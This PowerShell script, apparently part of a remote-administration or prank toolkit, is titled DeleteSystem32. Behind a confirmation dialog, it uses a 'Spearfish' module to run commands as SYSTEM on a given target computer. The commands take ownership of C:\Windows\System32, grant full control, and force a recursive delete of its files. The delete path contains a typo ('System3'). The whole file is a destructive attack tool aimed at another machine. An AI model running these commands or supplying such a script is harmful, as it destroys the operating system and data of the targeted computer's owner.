#Name: DeleteSystem32
#Description: Deletes all files possible in the Windows system32 file on the given computer
#Created by: Noah Kulas
#Created date: Oct. 24, 2019

param([string]$Target)

function ConfirmTextbox_Changed {
    if ($ConfirmTextbox.Text -eq "yes") {
        $ConfirmButton.Enabled = $true
    }
    else {
        $ConfirmButton.Enabled = $false
    }
}

function ConfirmButton_Click {
    $ConfirmButton.Enabled = $false
    $CancelButton.Enabled = $false
    $ConfirmTextbox.Enabled = $false

    .\Modules\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C takeown /F `"C:\Windows\System32`" /R" -AsSystem $true
    Start-Sleep -Seconds 15
    .\Modules\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C icacls `"C:\Windows\System32\*`" /Grant SYSTEM:F" -AsSystem $true
    Start-Sleep 15
    .\Modules\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C del `"C:\Windows\System3\*`" /F /S /Q" -AsSystem $true

    $ConfirmForm.Close()
}

function CancelButton_Click {
    $ConfirmForm.Close()
}

try {
    #Confirmation message
    Add-Type -AssemblyName System.Windows.Forms

    $ConfirmForm = New-Object System.Windows.Forms.Form
    $ConfirmForm.ClientSize = '350, 150'
    $ConfirmForm.text = "Delete sytem32"
    $ConfirmForm.TopMost = $false

    $WarningLabel = New-Object System.Windows.Forms.Label
    $WarningLabel.text = "WARNING! THIS WILL ACTUALLY DO IT!"
    $WarningLabel.AutoSize = $true
    $WarningLabel.location = New-Object System.Drawing.Point(35,20)
    $WarningLabel.font = 'Microsoft Sans Serif,10'

    $InstructionLabel = New-Object System.Windows.Forms.Label
    $InstructionLabel.text = "To continue, enter `"yes`" below.`nTo cancel, click cancel."
    $InstructionLabel.AutoSize = $true
    $InstructionLabel.location = New-Object System.Drawing.Point(35,50)
    $InstructionLabel.font = 'Microsoft Sans Serif,10'

    $ConfirmTextbox = New-Object System.Windows.Forms.TextBox
    $ConfirmTextbox.multiline = $false
    $ConfirmTextbox.width = 120
    $ConfirmTextbox.height = 20
    $ConfirmTextbox.location = New-Object System.Drawing.Point(35,90)
    $ConfirmTextbox.font = 'Microsoft Sans Serif,10'
    $ConfirmTextbox.Add_TextChanged({ ConfirmTextbox_Changed})

    $ConfirmButton = New-Object System.Windows.Forms.Button
    $ConfirmButton.text = "Confirm"
    $ConfirmButton.width = 70
    $ConfirmButton.height = 30
    $ConfirmButton.location = New-Object System.Drawing.Point(170,90)
    $ConfirmButton.font = 'Microsoft Sans Serif,10'
    $ConfirmButton.Enabled = $false
    $ConfirmButton.Add_Click({ ConfirmButton_Click })

    $CancelButton = New-Object System.Windows.Forms.Button
    $CancelButton.text = "Cancel"
    $CancelButton.width = 70
    $CancelButton.height = 30
    $CancelButton.location = New-Object System.Drawing.Point(250,90)
    $CancelButton.font = 'Microsoft Sans Serif,10'
    $CancelButton.Add_Click({ CancelButton_Click })

    $ConfirmForm.Controls.Add($WarningLabel)
    $ConfirmForm.Controls.Add($InstructionLabel)
    $ConfirmForm.Controls.Add($ConfirmTextbox)
    $ConfirmForm.Controls.Add($ConfirmButton)
    $ConfirmForm.Controls.Add($CancelButton)
    $ConfirmForm.ShowDialog()
    return "Success"
}
catch {
    return "Failure"
}